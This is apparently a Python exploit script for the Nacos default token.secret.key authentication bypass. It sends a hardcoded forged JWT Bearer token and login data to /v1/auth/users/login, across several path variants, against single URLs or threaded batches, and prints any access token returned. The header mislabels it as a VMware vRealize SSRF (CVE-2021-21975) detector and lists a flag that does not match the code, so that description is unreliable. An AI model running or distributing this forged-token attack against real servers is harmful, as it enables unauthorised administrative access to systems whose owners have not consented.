import argparse
import requests
import threading

'''
+-----------------------------------------------------------------+
漏洞名称:VMware vRealize Operations Manager SSRF漏洞 CVE-2021-21975  
功能：基于dnslog回显进行检测，单个检测，批量检测                                     
单个检测：python nacos_qvd_2023_6271.py -u url
批量检测：python nacos_qvd_2023_6271.py -f file.txt
+-----------------------------------------------------------------+                                     
'''

# 伪造用户登录时的请求头和请求数据
headers = {
    "User-Agent": "Firefox/124.0",
    "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6NDA4"
                     "MTkwNzk5M30.BdQSxmoftt9zePaqO1-B9QFSi1tsiiQ2mzKUjnZfQJk"}

data = {"username": "nacos", "password": "nacos123"}


# 定义函数，用于发起POST请求并判断回显结果，每次调用这个函数发送一个请求
def send_request(url):
    mid_urls = ['', '/nacos', '/home/nocos']
    end_url = '/v1/auth/users/login'
    for mid_url in mid_urls:
        full_url = url + mid_url + end_url
        try:
            response = requests.post(full_url, headers=headers, data=data, timeout=2)
            if response.status_code == 200 and response.json().get('accessToken'):
                print(f'{url} 存在token.secret.key默认配置漏洞')
                print(f'{response.json()}')
                return
        except requests.exceptions.RequestException as e:
            print(f'{url} 访问失败 {e}')
            return

    print('不存在token.secret.key默认配置漏洞')


if __name__ == '__main__':

    parser = argparse.ArgumentParser()
    parser.add_argument('-u',
                        '--url',
                        type=str,
                        default=None,
                        help='目标地址，带上http(s)://')
    parser.add_argument('-p',
                        '--path',
                        type=str,
                        default=None,
                        help='批量检测，带上http(s)://')
    args = parser.parse_args()

    if args.url:
        send_request(args.url)

    if args.path:
        # 从url.txt文件中读取URL列表
        with open(args.path, 'r') as f:
            urls = f.read().splitlines()

        threads = []
        for url in urls:
            t = threading.Thread(target=send_request, args=(url,))
            threads.append(t)
            t.start()

        # 等待所有线程完成
        for t in threads:
            t.join()
